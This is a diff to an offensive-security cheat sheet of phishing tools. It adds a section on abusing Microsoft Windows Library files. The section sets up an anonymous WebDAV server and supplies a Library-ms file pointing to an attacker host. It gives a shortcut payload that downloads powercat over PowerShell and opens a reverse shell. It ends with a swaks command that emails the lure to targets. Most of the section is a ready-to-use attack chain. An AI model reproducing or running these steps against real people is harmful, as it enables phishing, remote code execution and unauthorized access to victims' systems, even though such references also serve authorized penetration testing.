@@ -6,6 +6,7 @@
 
 - [Evilginx2](#evilginx2)
 - [Gophish](#gophish)
+- [Microsoft Windows Library Files](#microsoft-windows-library-files)
 - [Storm Breaker](#storm-breaker)
 - [The Social Engineering Toolkit (SET)](#the-social-engineering-toolkit-set)
 
@@ -181,6 +182,58 @@ $ go build
 
 ```c
 $ ssh -i ~/.ssh/<SSH_KEY> root@<RHOST> -p <RPORT> -L 3333:localhost:3333 -N -f
+```
+
+## Microsoft Windows Library Files
+
+### Installation of wsgidav
+
+```c
+$ pip3 install wsgidav
+```
+
+### Start wsgidav
+
+```c
+$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
+```
+
+### config.Library-ms
+
+```c
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://<LHOST></url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+### Shortcut File
+
+Right-click on Windows to create a new `shortcut file`.
+
+```c
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
+```
+
+Put the `shortcut file` into the webdav folder.
+
+```c
+$ swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach <FILE> --supress-data -ap
 ```
 
 ## Storm Breaker
